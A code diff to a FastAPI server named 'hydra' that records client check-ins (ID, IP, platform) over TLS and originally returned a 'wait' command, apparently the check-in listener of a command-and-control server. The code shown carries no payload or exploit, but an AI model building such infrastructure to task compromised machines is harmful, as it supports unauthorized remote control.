@@ -1,22 +1,53 @@
 from fastapi import FastAPI, Request
+from fastapi.middleware.cors import CORSMiddleware
 from contextlib import asynccontextmanager
 from db import init_db, register_client
+import uvicorn
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    # This runs when the server starts
+    # Initializes the SQLite database on startup
     await init_db()
     yield
-    # Cleanup logic goes here if needed
 
-app = FastAPI(lifespan=lifespan)
+app = FastAPI(lifespan=lifespan, redirect_slashes=False)
+
+# Standard CORS to prevent header rejections
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
 
 @app.get("/")
 async def status():
-    return {"hydra": "online", "version": "1.0.0"}
+    return {"hydra": "online", "status": "active"}
 
-@app.post("/checkin/{client_id}")
+# This route handles both GET and POST to bypass the 405 error
+@app.api_route("/checkin/{client_id}", methods=["GET", "POST"])
 async def checkin(client_id: str, platform: str, request: Request):
     client_ip = request.client.host
+    method = request.method
+    
+    print(f"[*] {method} request received from {client_id}")
+    print(f"[*] Source IP: {client_ip} | Platform: {platform}")
+
+    # Register the client regardless of the method used
     await register_client(client_id, platform, client_ip)
-    return {"response": "acknowledged", "command": "wait"}
+    
+    return {
+        "status": "success",
+        "method_detected": method,
+        "response": "acknowledged"
+    }
+
+if __name__ == "__main__":
+    # Ensure your .pem files are in the same directory
+    uvicorn.run(
+        app, 
+        host="0.0.0.0", 
+        port=8443, 
+        ssl_keyfile="key.pem", 
+        ssl_certfile="cert.pem"
+    )
